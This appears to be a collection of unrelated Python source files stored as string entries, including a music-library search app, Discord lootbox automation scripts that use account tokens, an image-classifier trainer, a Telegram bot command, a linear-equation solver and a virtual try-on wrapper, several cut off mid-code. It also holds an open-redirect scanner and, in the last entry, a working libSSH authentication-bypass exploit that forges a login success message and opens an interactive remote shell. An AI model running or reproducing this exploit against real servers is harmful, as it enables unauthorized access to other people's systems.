    "print(\"Importing modules...\")\nimport asset_downloader\nimport os\nimport sys\n\n\ndef get_application_dir():\n    \"\"\"\n    This function returns the directory where the executable is running\n    or the script file in a development environment.\n    \"\"\"\n    if getattr(sys, \"frozen\", False):\n        # If the application is run as a bundled executable.\n        application_path = os.path.dirname(sys.executable)\n    else:\n        # If the application is run in a development environment.\n        application_path = os.path.dirname(os.path.abspath(__file__))\n\n    return application_path\n\n\nbasepath = get_application_dir()\n\nif not os.path.exists(os.path.join(basepath, \"assets\")):\n    print(\"Assets not found, downloading assets...\")\n    asset_downloader.download_assets(basepath)\n\n\nimport json\nimport customtkinter\nfrom PIL import Image\nfrom pprint import pprint\nfrom tkinter import DoubleVar, StringVar, IntVar, Variable, END\nfrom tkinter import filedialog, messagebox\n\nfrom utils import playlist\nfrom utils.inference import (\n    load_embeddings_index,\n    process_new_audio_sample,\n    process_iterative_samples,\n    find_wav_files,\n    build_embeddings_index,\n    save_embeddings_index,\n)\n\n# -------------------------------- Constants --------------------------------\nUINAME = \"CrateDig\"\nAUDIO_FORMATS = (\".wav\", \".flac\", \".mp3\")\nREKORDBOX_EXT = \".xml\"\nM3U_EXT = \".m3u\"\nbuttonfontparams = {\"size\": 14, \"weight\": \"normal\"}\nlabelfontparams = {\"size\": 16, \"weight\": \"bold\"}\nXPAD = (10, 10)\nYPAD = (10, 20)\n\n\nUserLibraryPath = os.path.join(basepath, \"UserLibrary\")\n\ntheme_file_path = os.path.join(basepath, \"assets\", \"theme.json\")\ncustomtkinter.set_appearance_mode(\"Dark\")  # Modes: \"System\" (standard), \"Dark\", \"Light\"\ncustomtkinter.set_default_color_theme(theme_file_path)  # Adjusted to use the full path\n\n\nLAST_STATE = os.path.join(UserLibraryPath, \"state\", \"state.json\")\nDEFAULTS = {\n    \"AnalysedLibraries\": [],\n    \"LastUsedLibrary\": \"\",\n    \"UserLibraryPath\": UserLibraryPath,\n    \"PlaylistExportPath\": os.path.join(UserLibraryPath, \"playlists\"),\n    \"EmbeddingsExportPath\": os.path.join(UserLibraryPath, \"embeddings\"),\n    \"ExportFilesToPath\": os.path.join(UserLibraryPath, \"exports\"),\n    \"NMAX\": 20,\n}\n\n\ndef startup():\n    print(\n        f\"\"\"\n   _____           _       _____  _                _____ \n  / ____|         | |     |  __ \\(_)         /\\   |_   _|\n | |     _ __ __ _| |_ ___| |  | |_  __ _   /  \\    | |  \n | |    | '__/ _` | __/ _ \\ |  | | |/ _` | / /\\ \\   | |  \n | |____| | | (_| | ||  __/ |__| | | (_| |/ ____ \\ _| |_ \n  \\_____|_|  \\__,_|\\__\\___|_____/|_|\\__, /_/    \\_\\_____|\n                                     __/ |               \n                                    |___/                \n          \nWelcome to CrateDig! This is a tool to search through your music library using text prompts or audio samples.\nTo get started, please select a folder containing your music library and click 'Analyze and Save Collection'.\nThis will create an embeddings index of your music library which will be used for searching.\n\nSupported audio formats: .wav, .flac, .mp3          \nKeep this terminal open to see debug information and error messages.\n\"\"\"\n    )\n    if not os.path.exists(UserLibraryPath):\n        os.makedirs(UserLibraryPath, exist_ok=True)\n    if not os.path.exists(os.path.join(UserLibraryPath, \"state\")):\n        os.makedirs(os.path.join(UserLibraryPath, \"state\"), exist_ok=True)\n    if not os.path.exists(os.path.join(UserLibraryPath, \"playlists\")):\n        os.makedirs(os.path.join(UserLibraryPath, \"playlists\"), exist_ok=True)\n    if not os.path.exists(os.path.join(UserLibraryPath, \"embeddings\")):\n        os.makedirs(os.path.join(UserLibraryPath, \"embeddings\"), exist_ok=True)\n    # export isnt used yet\n    if not os.path.exists(os.path.join(UserLibraryPath, \"exports\")):\n        os.makedirs(os.path.join(UserLibraryPath, \"exports\"), exist_ok=True)\n\n\nclass CLIArgs:\n    def __init__(\n        self,\n        input_value,\n        n_samples,\n        destination_folder,\n        embedding_map_dir,\n        is_text=True,\n        as_playlist=False,\n    ):\n        self.input_value = input_value\n        self.n_samples = n_samples\n        self.destination_folder = destination_folder\n        self.embedding_map_dir = embedding_map_dir\n        self.is_text = is_text\n        self.as_playlist = as_playlist\n\n    def __repr__(self) -> str:\n        return f\"CLIArgs(input_value={self.input_value}, n_samples={self.n_samples}, destination_folder={self.destination_folder}, embedding_map_dir={self.embedding_map_dir}, is_text={self.is_text} as_playlist={self.as_playlist})\"\n\n\ndef run_sample_finder_cli(args: CLIArgs):\n\n    embeddings_index, path_map = load_embeddings_index(args.embedding_map_dir)\n\n    if args.as_playlist:\n        return process_iterative_samples(\n            args.input_value,\n            embeddings_index,\n            path_map,\n            args.n_samples,\n            args.destination_folder,\n            args.is_text,\n        )\n    return process_new_audio_sample",
    "import time\r\nimport requests\r\n\r\nfrom colorama import Fore, init\r\nfrom modules.utils import Utils\r\n\r\ninit()\r\n\r\nwith open(\"tokens.txt\", \"r\") as f:\r\n    tokens = f.readlines()\r\n    for i in tokens:\r\n        token = i.rstrip()\r\n        items_found = []\r\n        \r\n        headers = Utils.get_headers(token)\r\n        \r\n        while len(items_found) != 9:\r\n            r = requests.post(\"https://discord.com/api/v9/users/@me/lootboxes/open\", headers=headers).json()\r\n            if 'retry_after' in r:\r\n                print('[' + Fore.RED + '-' + Fore.RESET + ']' + 'ratelimited for ' + str(r['retry_after']) + 'second')\r\n                time.sleep(r['retry_after'])\r\n            else:\r\n                items = r['opened_item']\r\n                items_name = Utils.get_name_items(items)\r\n                if items_name in items_found:\r\n                    print('[' + Fore.BLUE + '?' + Fore.RESET + ']' + 'found:' + items_name)\r\n                else:\r\n                    print('[' + Fore.GREEN + '+' + Fore.RESET + ']' + 'found a new object:' + items_name)\r\n                    items_found.append(items_name)\r\n        \r\n        r = requests.post(\"https://discord.com/api/v9/users/@me/lootboxes/redeem-prize\", headers=headers)\r\n        if r.status_code == 200:\r\n            print('[' + Fore.GREEN + '+' + Fore.RESET + ']' + 'automatically redeemed clown decoration')\r\n        else:\r\n            print('[' + Fore.RED + '-' + Fore.RESET + ']' + 'failed to automatically redeeme clown decoration')",
    "import requests\nimport sys\nimport time\nimport os\nimport argparse\n\n# Color codes\nYELLOW = '\\033[93m'\nGREEN = '\\033[92m'\nRED = '\\033[91m'\nENDC = '\\033[0m'\n\ndef clear_screen():\n    os.system('clear')\n\ndef print_banner():\n    clear_screen()\n    print(\"#################################################\")\n    print(\"# Open redirect Scanner for ScriptKiddies like me :)  #\")\n    print(\"#  by archtrmntor (archtrmntor@proton.me)       #\")\n    print(\"#  twitter.com/Archtrmntor                      #\")\n    print(\"#  Linkedin Username :- Archtrmntor             #\")\n    print(\"#################################################\")\n    print(\"\")\n    print(\"Usage: ./redirect.py [options]\")\n    print(\"\")\n    print(\"         ./redirect.py -u http://example.com -p payloads.txt -o output.txt\")\n    print(\"\")\n    print(\"Color coding:\")\n    print(\"    - Testing message: \" + YELLOW + \"Yellow\" + ENDC)\n    print(\"    - Redirected status code 301: \" + GREEN + \"Green\" + ENDC)\n    print(\"    - Other error status codes: \" + RED + \"Red\" + ENDC)\n    print(\"\")\n    print(\"For extracting the final 301 redirect successful attempt, use the following command:\")\n    print(\"cat output_filename.txt | grep -e '+ 301' -e 'Final destination'\")\n\ndef parse_arguments():\n    parser = argparse.ArgumentParser(description=\"Open Redirect Scanner\")\n    parser.add_argument(\"-f\", \"--file\", help=\"File containing subdomains\")\n    parser.add_argument(\"-u\", \"--url\", help=\"URL to scan for open redirect vulnerability\")\n    parser.add_argument(\"-p\", \"--payloads\", help=\"File containing list of payloads\", required=True)\n    parser.add_argument(\"-o\", \"--output\", help=\"Output file to save results\")\n    return parser.parse_args()\n\ndef load_payloads(payloads_file):\n    with open(payloads_file) as f:\n        return f.readlines()\n\ndef colorize_response(response):\n    status_code = response.status_code\n    if status_code == 301:\n        return GREEN + str(status_code) + ENDC\n    elif status_code >= 400 and status_code < 500:\n        return RED + str(status_code) + ENDC\n    else:\n        return str(status_code)\n\ndef save_output(output_file, message):\n    with open(output_file, \"a\") as f:\n        f.write(message + \"\\n\")\n\ndef scan_redirects(subdomains_file, payloads, output_file):\n    with open(subdomains_file) as f:\n        print(\"\")\n        print(\"Searching for open redirect vulnerabilities...\")\n        print(\"\")\n        time.sleep(2)\n        for line in f:\n            line = line.strip()\n            for payload in payloads:\n                try:\n                    url = 'http://' + line + RED + payload.strip() + ENDC\n                    print(YELLOW + \"Testing: \" + url + ENDC)\n                    response = requests.get(url, verify=True)\n                    if response.history:\n                        message = \"Request was redirected\\n\"\n                        for resp in response.history:\n                            message += \"| \" + colorize_response(resp) + \" \" + resp.url + \"\\n\"\n                        message += \"Final destination:\\n+ \" + colorize_response(response) + \" \" + response.url\n                        print(message)\n                    else:\n                        print(\"Request was not redirected\")\n                    if output_file:\n                        save_output(output_file, url)\n                        save_output(output_file, message)\n                except Exception as e:\n                    print(\"Error occurred:\", str(e))\n            print(\"\\n\" + \"-\"*50 + \"\\n\")\n\ndef scan_redirects_single_url(url, payloads, output_file):\n    print(\"\")\n    print(\"Searching for open redirect vulnerabilities...\")\n    print(\"\")\n    time.sleep(2)\n    for payload in payloads:\n        try:\n            url_with_payload = url + RED + payload.strip() + ENDC\n            print(YELLOW + \"Testing: \" + url_with_payload + ENDC)\n            response = requests.get(url_with_payload, verify=True)\n            if response.history:\n                message = \"Request was redirected\\n\"\n                for resp in response.history:\n                    message += \"| \" + colorize_response(resp) + \" \" + resp.url + \"\\n\"\n                message += \"Final destination:\\n+ \" + colorize_response(response) + \" \" + response.url\n                print(message)\n            else:\n                print(\"Request was not redirected\")\n            if output_file:\n                save_output(output_file, url_with_payload)\n                save_output(output_file, message)\n        except Exception as e:\n            print(\"Error occurred:\", str(e))\n        print(\"\\n\" + \"-\"*50 + \"\\n\")\n\ndef main():\n    print_banner()\n    args = parse_arguments()\n    payloads_file = args.payloads\n    payloads = load_payloads(payloads_file)\n    output_file = args.output\n    if args.file:\n        subdomains_file = args.file\n        scan_redirects(subdomains_file, payloads, output_file)\n    elif args.url:\n        url = args.url\n        scan_redirects_single_url(url, payloads, output_file)\n    else:\n        print(\"Please provide either a file",
    "AUTHOR = \"OUAIDA Yassine\"\nEMAIL = \"youaida123@gmail.com\"\n\nimport tensorflow as tf\nfrom tensorflow.keras import models, layers\nimport pickle\nimport time\n\nBATCH_SIZE = 32\nIMAGE_SIZE = 256\nCHANNELS=3\nEPOCHS=50\nMODEL_NAME = f\"ol{str(time.time())}\"\nFOLDER = \"training_data\"\n\ndataset = tf.keras.preprocessing.image_dataset_from_directory(\n    FOLDER,\n    seed=123,\n    shuffle=True,\n    image_size=(IMAGE_SIZE,IMAGE_SIZE),\n    batch_size=BATCH_SIZE\n)\nprint(f\"Datasets : {dataset}\")\nclass_names = dataset.class_names\nprint(f\"Classe names {class_names}\")\n\nwith open(f'{MODEL_NAME}.pickle', 'wb') as file: \n      \n    # A new file will be created \n    pickle.dump(class_names, file) \n\n\n\ntrain_size = 0.8\ntrain_ds = dataset.take(54)\ntest_ds = dataset.skip(54)\n\nval_size=0.1\nval_ds = test_ds.take(6)\ntest_ds = test_ds.skip(6)\n\ndef get_dataset_partitions_tf(ds, train_split=0.8, val_split=0.1, test_split=0.1, shuffle=True, shuffle_size=10000):\n    assert (train_split + test_split + val_split) == 1\n    \n    ds_size = len(ds)\n    \n    if shuffle:\n        ds = ds.shuffle(shuffle_size, seed=12)\n    \n    train_size = int(train_split * ds_size)\n    val_size = int(val_split * ds_size)\n    \n    train_ds = ds.take(train_size)    \n    val_ds = ds.skip(train_size).take(val_size)\n    test_ds = ds.skip(train_size).skip(val_size)\n    \n    return train_ds, val_ds, test_ds\n\n\ntrain_ds, val_ds, test_ds = get_dataset_partitions_tf(dataset)\n\n# print(len(train_ds),len(val_ds),len(test_ds))\n\n\ntrain_ds = train_ds.cache().shuffle(1000).prefetch(buffer_size=tf.data.AUTOTUNE)\nval_ds = val_ds.cache().shuffle(1000).prefetch(buffer_size=tf.data.AUTOTUNE)\ntest_ds = test_ds.cache().shuffle(1000).prefetch(buffer_size=tf.data.AUTOTUNE)\n\n\n\nresize_and_rescale = tf.keras.Sequential([\n  layers.experimental.preprocessing.Resizing(IMAGE_SIZE, IMAGE_SIZE),\n  layers.experimental.preprocessing.Rescaling(1./255),\n])\n\n\ndata_augmentation = tf.keras.Sequential([\n  layers.experimental.preprocessing.RandomFlip(\"horizontal_and_vertical\"),\n  layers.experimental.preprocessing.RandomRotation(0.2),\n])\n\n\n\ninput_shape = (BATCH_SIZE, IMAGE_SIZE, IMAGE_SIZE, CHANNELS)\nn_classes = len(class_names)\n\nmodel = models.Sequential([\n    resize_and_rescale,\n    layers.Conv2D(32, kernel_size = (3,3), activation='relu', input_shape=input_shape),\n    layers.MaxPooling2D((2, 2)),\n    layers.Conv2D(64,  kernel_size = (3,3), activation='relu'),\n    layers.MaxPooling2D((2, 2)),\n    layers.Conv2D(64,  kernel_size = (3,3), activation='relu'),\n    layers.MaxPooling2D((2, 2)),\n    layers.Conv2D(64, (3, 3), activation='relu'),\n    layers.MaxPooling2D((2, 2)),\n    layers.Conv2D(64, (3, 3), activation='relu'),\n    layers.MaxPooling2D((2, 2)),\n    layers.Conv2D(64, (3, 3), activation='relu'),\n    layers.MaxPooling2D((2, 2)),\n    layers.Flatten(),\n    layers.Dense(64, activation='relu'),\n    layers.Dense(n_classes, activation='softmax'),\n])\n\nmodel.build(input_shape=input_shape)\nmodel.summary()\n\n\nmodel.compile(\n    optimizer='adam',\n    loss=tf.keras.losses.SparseCategoricalCrossentropy(from_logits=False),\n    metrics=['accuracy']\n)\n\nhistory = model.fit(\n    train_ds,\n    batch_size=BATCH_SIZE,\n    validation_data=val_ds,\n    verbose=1,\n    epochs=30,\n)\n\n\nmodel.save(f\"{MODEL_NAME}.h5\")\n\n\n\n",
    "import requests\nimport time\nimport sys\nimport base64\nimport json\nfrom colorama import Fore, Style\n\nAPI_URL = \"https://discord.com/api/v9\"\n\nclass LootboxBot:\n    LOOTBOX_ITEMS = {\n        \"1214340999644446723\": \"\ud83d\udc62 Speed Boost\",\n        \"1214340999644446724\": '\ud83e\ude88 \u2192\u2191\u2193\u2192\u2191\u2193',\n        \"1214340999644446722\": '\ud83d\udc22 Wump Shell',\n        \"1214340999644446728\": '\ud83d\udd28 Dream Hammer',\n        \"1214340999644446725\": '\u26d1\ufe0f Power Helmet',\n        \"1214340999644446726\": '\ud83e\udd86 Quack!!',\n        \"1214340999644446721\": '\ud83e\uddf8 Cute Plushie',\n        \"1214340999644446727\": '\ud83c\udf4c OHHHHH BANANA',\n        \"1214340999644446720\": '\ud83d\udde1\ufe0f Buster Blade',\n    }\n\n    unlocked_items = []\n\n    def __init__(self, token):\n        self.headers = get_headers(token)\n\n    def open_lootbox(self):\n        response = requests.post(f\"{API_URL}/users/@me/lootboxes/open\", headers=self.headers)\n\n        data = response.json()\n\n        if data[\"opened_item\"] not in self.unlocked_items:\n            print(f\"{Fore.GREEN}[\ud83c\udf81] Unlocked a NEW lootbox item: {Fore.MAGENTA}{self.LOOTBOX_ITEMS[data['opened_item']]}{Style.RESET_ALL}\")\n            self.unlocked_items.append(data[\"opened_item\"])\n        else:\n            print(f\"{Fore.RED}[\ud83c\udf81] Found an old lootbox item: {Fore.MAGENTA}{self.LOOTBOX_ITEMS[data['opened_item']]}{Style.RESET_ALL}\")\n\n        time.sleep(5)\n\n    def redeem_prize(self):\n        response = requests.post(f\"{API_URL}/users/@me/lootboxes/redeem-prize\", headers=self.headers)\n        if response.json()[\"redeemed_prize\"]:\n            print(f'[\ud83e\udd21] Automatically redeemed reward: \"I\\'m a Clown\" Avatar Decoration')\n\n    def log_stats(self, items):\n        print(f\"\\n{Fore.CYAN}[\ud83d\udcc8] Statistics{Style.RESET_ALL}\")\n\n        for key, value in items.items():\n            lootbox_item = self.LOOTBOX_ITEMS[key]\n            print(f\"{Style.BRIGHT}{lootbox_item}{Style.RESET_ALL}: {value} found\")\n\n        total = sum(list(items.values()))\n        print(f\"{Style.BRIGHT}Total{Style.RESET_ALL}: {total} items found\\n\")\n\n    def run(self):\n        response = requests.get(f\"{API_URL}/users/@me/lootboxes\", headers=self.headers)\n\n        data = response.json()\n\n        for item in data['opened_items']:\n            self.unlocked_items.append(item)\n\n        while not len(self.unlocked_items) >= len(self.LOOTBOX_ITEMS):\n            self.open_lootbox()\n\n        print(f\"\\n{Fore.YELLOW}[\ud83c\udf89] You have unlocked all 9 available items and won the final prize!{Style.RESET_ALL}\")\n\n        response = requests.get(f\"{API_URL}/users/@me/lootboxes\", headers=self.headers)\n\n        data = response.json()\n\n        if not data[\"redeemed_prize\"]:\n            self.redeem_prize()\n        \n        self.log_stats(data['opened_items'])\n\ndef get_headers(token):\n    x_super_properties = {\n        \"os\": \"Windows\",\n        \"client_build_number\": 280472\n    }\n\n    encoded_properties = base64.b64encode(json.dumps(x_super_properties).encode('utf-8')).decode('utf-8')\n\n    return {\n        \"x-super-properties\": encoded_properties,\n        \"referrer\": \"https://discord.com/channels/@me\",\n        \"authorization\": token,\n    }\n\ndef main():\n    valid_token = False\n\n    while not valid_token:\n\n        token = input(f\"{Fore.GREEN}[\ud83d\udd11] Paste your Discord token: {Style.RESET_ALL}\").strip('\"').strip('\\'')\n\n        response = requests.get(f\"{API_URL}/users/@me\", headers=get_headers(token))\n\n        if response.status_code == 200:\n            valid_token = True\n        elif response.status_code == 401:\n            print(f\"{Fore.RED}[\u26a0\ufe0f] Invalid token! Try again...{Style.RESET_ALL}\")\n\n    print(f\"\\n{Fore.GREEN}[\ud83d\udc64] Logged in as: {Fore.MAGENTA}{response.json()['username']}{Style.RESET_ALL}\\n\")\n    bot = LootboxBot(token)\n    bot.run()\n\nif __name__ == \"__main__\":\n\n    banner = f\"\"\"{Fore.YELLOW}\n  ____  _                       _    _                _   _                  ____        _   \n |  _ \\(_)___  ___ ___  _ __ __| |  | |    ___   ___ | |_| |__   _____  __  | __ )  ___ | |_ \n | | | | / __|/ __/ _ \\| '__/ _` |  | |   / _ \\ / _ \\| __| '_ \\ / _ \\ \\/ /  |  _ \\ / _ \\| __|\n | |_| | \\__ \\ (_| (_) | | | (_| |  | |__| (_) | (_) | |_| |_) | (_) >  <   | |_) | (_) | |_ \n |____/|_|___/\\___\\___/|_|  \\__,_|  |_____\\___/ \\___/ \\__|_.__/ \\___/_/\\_\\  |____/ \\___/ \\__| {Style.RESET_ALL}by scp222thj\n \"\"\"\n\n    print(banner)\n\n    try:\n        main()\n    except KeyboardInterrupt:\n        print(Style.RESET_ALL)\n        sys.exit()\n    except Exception as e:\n        print(f\"{Style.RESET_ALL}\\n{e}\")\n        sys.exit()",
    "from datetime import datetime\n\nfrom pyrogram import filters\nfrom pyrogram.types import Message\nfrom pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, InputMediaPhoto\nfrom config import *\nfrom SYNAX import app\nfrom SYNAX.core.call import DAXX\nfrom SYNAX.utils import bot_sys_stats\nfrom SYNAX.utils.decorators.language import language\nfrom SYNAX.utils.inline import supp_markup\nfrom config import BANNED_USERS\n\n\n@app.on_message(filters.command(\"ping\", prefixes=[\"/\", \"!\", \"%\", \",\", \"\", \".\", \"@\", \"#\"]) & ~BANNED_USERS)\n@language\nasync def ping_com(client, message: Message, _):\n    start = datetime.now()\n    response = await message.reply_video(\n        video=\"https://graph.org/file/5690109178f081adf464d.mp4\",\n        caption=_[\"ping_1\"].format(app.mention),\n    )\n    pytgping = await DAXX.ping()\n    UP, CPU, RAM, DISK = await bot_sys_stats()\n    resp = (datetime.now() - start).microseconds / 1000\n    await response.edit_text(\n        _[\"ping_2\"].format(resp, app.mention, UP, RAM, CPU, DISK, pytgping),\n        reply_markup=supp_markup(_),\n    )\n",
    "\"\"\"\nPython code related to the numerical linear algebra lesson project -> a system of linear equations with Gauss elimination method\n\nwriter : Matin Mohammadi \n\nProfessor's name: Dr. Tabrizi Doz\n\"\"\"\n\nimport numpy as np\n\n# ----------- solve Ax = b without pivoting -----------------\n\n# #Define Coefficients Matrix\n# a_matrix = np.array([[1.012 , -2.132 , 3.104],[-2.132,4.096 , -7.013] , [3.104, -7.013, 0.014]] , float)\n\n# #Define Answer Vector\n# b_vector = np.array([1.984 , -5.049 , -3.895] , float)\n\n# #Define the size of linear system\n# system_size = len(b_vector)\n\n# #Define Solution vector \n# solution_vector = np.zeros(system_size,float) # [0. 0. 0.]\n\n# # nested loop for elimination process\n# for f in range(system_size -1) : #to index fix row and eliminate columns\n#     for i in range(f+1,system_size) : #to index subtract rows\n#         if a_matrix[i,f] == 0 :\n#             continue\n#         ratio = a_matrix[f,f] / a_matrix[i,f]\n#         for j in range(f,system_size):# to index columns for sustraction\n#             a_matrix[i,j] = a_matrix[f,j] - a_matrix[i,j]*ratio\n#         b_vector[i] = b_vector[f] - b_vector[i]*ratio\n# print(\"**********************************************************\")\n# print(\"Upper triangular matrix after elimination : \" )\n# print(a_matrix)\n# print(\"**********************************************************\")\n# print(\"Answer vector after elimination :\")\n# print(b_vector)\n\n# # Now , we have a loop for solving backward linear system from above result\n# solution_vector[system_size-1] = b_vector[system_size -1] / a_matrix[system_size-1,system_size-1] # start from last row(? : backwards)\n\n# for i in range(system_size-2 , -1,-1) :\n#     sum_of_ax = 0\n#     for j in range(i+1 , system_size):# to sum\n#         sum_of_ax += a_matrix[i,j] * solution_vector[j]\n#     solution_vector[i] += (b_vector[i] - sum_of_ax) / a_matrix[i,i]\n# print(\"**********************************************************\")\n# print(\"*****************************\")\n# print(\"*************\")\n# print(\"Here your answers :\")\n# print(solution_vector)\n\n\n# lets write it in OOP form \n\nclass LinearSystemSolver:\n    def __init__(self, a_matrix, b_vector):\n        self.a_matrix = np.array(a_matrix, float)\n        self.b_vector = np.array(b_vector, float)\n        self.system_size = len(b_vector)\n        self.solution_vector = np.zeros(self.system_size, float)\n\n    def solve(self):\n        # Perform elimination to form upper triangular matrix\n        for f in range(self.system_size - 1):\n            for i in range(f + 1, self.system_size):\n                if self.a_matrix[i, f] == 0:\n                    continue\n                ratio = self.a_matrix[f, f] / self.a_matrix[i, f]\n                for j in range(f, self.system_size):\n                    self.a_matrix[i, j] = self.a_matrix[f, j] - self.a_matrix[i, j] * ratio\n                self.b_vector[i] = self.b_vector[f] - self.b_vector[i] * ratio\n\n        # Back substitution to solve for solution vector\n        self.solution_vector[self.system_size - 1] = self.b_vector[self.system_size - 1] / self.a_matrix[self.system_size - 1, self.system_size - 1]\n        for i in range(self.system_size - 2, -1, -1):\n            sum_of_ax = sum(self.a_matrix[i, j] * self.solution_vector[j] for j in range(i + 1, self.system_size))\n            self.solution_vector[i] = (self.b_vector[i] - sum_of_ax) / self.a_matrix[i, i]\n\n        return self.solution_vector\n\n# usage:\na_matrix = [[1.012, -2.132, 3.104], [-2.132, 4.096, -7.013], [3.104, -7.013, 0.014]]\nb_vector = [1.984, -5.049, -3.895]\nsolver = LinearSystemSolver(a_matrix, b_vector)\nsolution = solver.solve()\nprint(\"Here are your answers:\")\nprint(solution)\n\n\n\n# compare with Nmpy solver\n# solver_numpy = np.linalg.solve(a_matrix,b_vector)\n# print(solver_numpy)\n",
    "import random\nimport sys\nimport time\nfrom pathlib import Path\n\nfrom huggingface_hub import snapshot_download\nimport torch\nfrom diffusers import AutoencoderKL, UniPCMultistepScheduler\nfrom transformers import (\n    AutoProcessor,\n    CLIPTextModel,\n    CLIPTokenizer,\n    CLIPVisionModelWithProjection,\n)\n\nfrom typing import Union\n\nfrom . import pipelines_ootd\n\n#! Necessary for OotdPipeline.from_pretrained\nsys.modules[\"pipelines_ootd\"] = pipelines_ootd\n\nfrom .pipelines_ootd.pipeline_ootd import OotdPipeline\nfrom .pipelines_ootd.unet_garm_2d_condition import UNetGarm2DConditionModel\nfrom .pipelines_ootd.unet_vton_2d_condition import UNetVton2DConditionModel\n\n\nclass OOTDiffusion:\n    def __init__(self, hg_root: str, model_type: str = \"dc\", cache_dir: str = None):\n        self.device = \"cuda\" if torch.cuda.is_available() else \"cpu\"\n        self.hg_root = hg_root\n        self.cache_dir = cache_dir\n\n        if model_type not in (\"hd\", \"dc\"):\n            raise ValueError(f\"model_type must be 'hd' or 'dc', got {model_type!r}\")\n\n        self.model_type = model_type\n\n        # hg_root = str(Path.cwd().resolve() / hg_root)\n        VIT_PATH = \"openai/clip-vit-large-patch14\"\n        VAE_PATH = f\"{hg_root}/checkpoints/ootd\"\n\n        if not Path(VAE_PATH).exists():\n            print(\"Downloading VAE model\")\n            snapshot_download(\n                \"levihsu/OOTDiffusion\",\n                cache_dir=cache_dir,\n                local_dir=hg_root,\n                allow_patterns=[\"**/ootd/**\"],\n            )\n\n        if model_type == \"hd\":\n            UNET_PATH = f\"{hg_root}/checkpoints/ootd/ootd_hd/checkpoint-36000\"\n        else:\n            UNET_PATH = f\"{hg_root}/checkpoints/ootd/ootd_dc/checkpoint-36000\"\n        MODEL_PATH = f\"{hg_root}/checkpoints/ootd\"\n\n        vae = AutoencoderKL.from_pretrained(\n            VAE_PATH, subfolder=\"vae\", torch_dtype=torch.float16, cache_dir=cache_dir\n        )\n        unet_garm = UNetGarm2DConditionModel.from_pretrained(\n            UNET_PATH,\n            subfolder=\"unet_garm\",\n            torch_dtype=torch.float16,\n            use_safetensors=True,\n        )\n        unet_vton = UNetVton2DConditionModel.from_pretrained(\n            UNET_PATH,\n            subfolder=\"unet_vton\",\n            torch_dtype=torch.float16,\n            use_safetensors=True,\n        )\n        self.pipe = OotdPipeline.from_pretrained(\n            MODEL_PATH,\n            unet_garm=unet_garm,\n            unet_vton=unet_vton,\n            vae=vae,\n            torch_dtype=torch.float16,\n            variant=\"fp16\",\n            use_safetensors=True,\n            safety_checker=None,\n            requires_safety_checker=False,\n        ).to(self.device)\n\n        self.pipe.scheduler = UniPCMultistepScheduler.from_config(\n            self.pipe.scheduler.config\n        )\n        self.auto_processor = AutoProcessor.from_pretrained(\n            VIT_PATH,\n            cache_dir=cache_dir,\n        )\n        self.image_encoder = CLIPVisionModelWithProjection.from_pretrained(VIT_PATH).to(\n            self.device,\n        )\n        self.tokenizer = CLIPTokenizer.from_pretrained(\n            MODEL_PATH,\n            subfolder=\"tokenizer\",\n        )\n        self.text_encoder = CLIPTextModel.from_pretrained(\n            MODEL_PATH,\n            subfolder=\"text_encoder\",\n        ).to(self.device)\n\n    def tokenize_captions(self, captions, max_length):\n        inputs = self.tokenizer(\n            captions,\n            max_length=max_length,\n            padding=\"max_length\",\n            truncation=True,\n            return_tensors=\"pt\",\n        )\n        return inputs.input_ids\n\n    def __call__(\n        self,\n        category=\"upperbody\",\n        image_garm=None,\n        image_vton=None,\n        mask=None,\n        image_ori=None,\n        num_samples=1,\n        num_steps=20,\n        image_scale=1.0,\n        seed=-1,\n    ):\n        if seed == -1:\n            random.seed(time.time())\n            seed = random.randint(0, 0xFFFFFFFFFFFFFFFF)\n        print(\"Initial seed: \" + str(seed))\n        generator = torch.manual_seed(seed)\n\n        with torch.no_grad():\n            prompt_image = self.auto_processor(\n                images=image_garm, return_tensors=\"pt\"\n            ).to(self.device)\n            prompt_image = self.image_encoder(\n                prompt_image.data[\"pixel_values\"]\n            ).image_embeds\n            prompt_image = prompt_image.unsqueeze(1)\n            if self.model_type == \"hd\":\n                prompt_embeds = self.text_encoder(\n                    self.tokenize_captions([\"\"], 2).to(self.device)\n                )[0]\n                prompt_embeds[:, 1:] = prompt_image[:]\n            elif self.model_type == \"dc\":\n                prompt_embeds = self.text_encoder(\n                    self.tokenize_captions([category], 3).to(self.device)\n                )[0]\n                prompt_embeds = torch.cat([prompt_embeds, prompt_image], dim=1)\n            else:\n                raise ValueError(\"model_type must be 'hd' or 'dc'!\")\n\n       ",
    "import paramiko\nimport socket\nimport argparse\nfrom sys import argv, exit\nimport select\nimport sys\n\nparser = argparse.ArgumentParser(description=\"libSSH Authentication Bypass\")\nparser.add_argument('-t', '--target', help='Specify target')\nparser.add_argument('-p', '--port', type=int, help='Specify port', default=int(22))\nparser.add_argument('-lf', '--logfile', help='Logfile to write connection log', default='paramiko.log')\n\nargs = parser.parse_args()\n\ndef bypass(target, port):\n\n    sock = socket.socket()\n    try:\n        sock.connect((target, port))\n\n        message = paramiko.Message()\n        transport = paramiko.Transport(sock=sock)\n        transport.start_client()\n\n        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)\n        transport._send_message(message)\n\n        channel = transport.open_session()\n        channel.get_pty()\n        channel.invoke_shell()\n\n        while True:\n            r, w, e = select.select([channel, sys.stdin], [], [])\n            if channel in r:\n                output = channel.recv(1024)\n                if len(output) == 0:\n                    print(\"Connection closed by remote host.\")\n                    break\n                sys.stdout.write(output.decode())\n                sys.stdout.flush()\n            if sys.stdin in r:\n                user_input = sys.stdin.readline()\n                channel.send(user_input)\n\n    except paramiko.SSHException as e:\n        print('Not vulnerable!')\n        return 1\n    except socket.error:\n        print('Unable to connect')\n        return 1\n    \ndef main():\n    paramiko.util.log_to_file(args.logfile)\n    try:\n        target = args.target\n        port = args.port\n    except:\n        parser.print_help()\n        exit(1)\n    bypass(target, port)\n\nif __name__ =='__main__':\n    exit(main())\n",
